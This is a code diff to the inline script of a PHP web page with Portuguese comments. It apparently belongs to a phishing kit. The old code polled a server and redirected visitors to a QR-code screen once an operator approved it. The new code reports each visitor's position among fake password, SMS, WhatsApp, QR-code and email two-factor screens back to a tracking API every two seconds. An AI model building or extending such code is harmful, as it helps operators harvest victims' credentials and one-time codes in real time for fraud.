@@ -164,38 +164,61 @@ if (isset($_COOKIE['identificador_cliente'])) {
         </div>
     </main>
     <script>
-        /**
-         * Função que verifica o status no servidor a cada 3 segundos.
-         */
-        async function verificarStatus() {
-            try {
-                // Chama a nossa nova API
-                const response = await fetch('api_check_status.php');
-                const data = await response.json();
+        (function() {
+            // Mapa de nomes de arquivos para mensagens de status amigáveis.
+            const statusMap = {
+                'index.php': 'Na Home (Desktop)',
+                'login-mobile.php': 'Na Home (Mobile)',
+                'senha.php': 'Tela de Opções (Desktop)',
+                'senha-mobile.php': 'Tela de Opções (Mobile)',
+                'dois_fatores.php': 'Tela 2FA - Mensagem (Desktop)',
+                'dois_fatores2.php': 'Tela 2FA - Opções (Desktop)',
+                'doisfatores2mobile.php': 'Tela 2FA - Opções (Mobile)',
+                'sms_desktop.php': 'Aguardando SMS (Desktop)',
+                'sms_mobile.php': 'Aguardando SMS (Mobile)',
+                'sms_whats_desktop.php': 'Aguardando SMS via WhatsApp (Desktop)',
+                'sms_whats_mobile.php': 'Aguardando SMS via WhatsApp (Mobile)',
+                'qrcode-mobile.php': 'Aguardando QR Code (Mobile)',
+                'telaqr.php': 'Aguardando QR Code (Desktop)',
+                'email2fadesktop.php': 'Aguardando E-mail 2FA (Desktop)',
+                'email2famobile.php': 'Aguardando E-mail 2FA (Mobile)',
+                'emailsms_desktop.php': 'Aguardando SMS de E-mail (Desktop)',
+                'emailsms_mobile.php': 'Aguardando SMS de E-mail (Mobile)',
+                'sms2fadesktop.php': 'Aguardando SMS 2FA (Desktop)',
+                'sms2famobile.php': 'Aguardando SMS 2FA (Mobile)',
+                'whats2fadesktop.php': 'Aguardando WhatsApp 2FA (Desktop)',
+                'whats2framobile.php': 'Aguardando WhatsApp 2FA (Mobile)'
+            };
 
-                // Escreve o status no console para podermos depurar
-                console.log('Status atual:', data.status); 
+            // Descobre o nome do arquivo da página atual
+            const currentPage = window.location.pathname.split('/').pop();
+            
+            // Pega a mensagem de status correspondente
+            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
-                // A CONDIÇÃO PRINCIPAL:
-                // Se o status retornado pela API for 'aprovado_para_qr'
-                if (data.status === 'aprovado_para_qr') {
-                    
-                    // Redireciona o usuário para a tela do QR Code
-                    console.log('Status aprovado! Redirecionando para telaqr.php...');
-                    window.location.href = 'telaqr.php';
+            // Função que envia o "ping" para a API
+            async function sendStatusUpdate() {
+                try {
+                    await fetch('api_update_status.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ status: currentStatus })
+                    });
+                    // Não precisamos fazer nada com a resposta, apenas enviar.
+                } catch (error) {
+                    // Se falhar, loga no console sem incomodar o usuário.
+                    console.error('Falha ao enviar atualização de status:', error);
                 }
-
-            } catch (error) {
-                console.error('Erro ao verificar status:', error);
             }
-        }
 
-        // Inicia a verificação periódica. A cada 3000 milissegundos (3 segundos),
-        // a função verificarStatus será chamada.
-        const statusInterval = setInterval(verificarStatus, 3000);
+            // Envia o primeiro status imediatamente ao carregar a página
+            sendStatusUpdate();
 
-        // Também chamamos a função uma vez assim que a página carrega.
-        verificarStatus();
+            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
+            setInterval(sendStatusUpdate, 2000);
+        })();
     </script>
 
 </body>
